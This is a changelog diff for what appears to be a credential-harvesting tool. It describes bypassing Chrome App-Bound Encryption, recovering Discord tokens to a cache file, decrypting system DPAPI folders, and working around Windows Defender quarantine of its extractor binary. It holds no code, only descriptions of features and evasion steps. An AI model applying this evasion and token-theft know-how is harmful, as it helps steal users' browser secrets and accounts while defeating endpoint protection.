@@ -1,5 +1,12 @@
 # Changelog
 
+## 0.2.9
+
+- ABE retry: a zero exit without output is now a failure, so the browser-close (`-k`) retry actually runs. The helper captures `abe_log=` for diagnosis.
+- `token` command: forces Discord token recovery on demand and writes `cache/discord/token.txt`, so a failed automatic attempt can be retried without a full harvest.
+- `decrypt.py --system-protect` accepts the whole `ProtectSystem` folder as well as the `S-1-5-18` child.
+
+
 ## 0.2.8
 
 - ABE resilience: Defender quarantined `chromelevator_x64.exe.tmp` before the move, so every browser failed and no `v20=` was written. Extraction now writes the final filename directly, starts it as soon as possible and retries up to three times on quarantine.
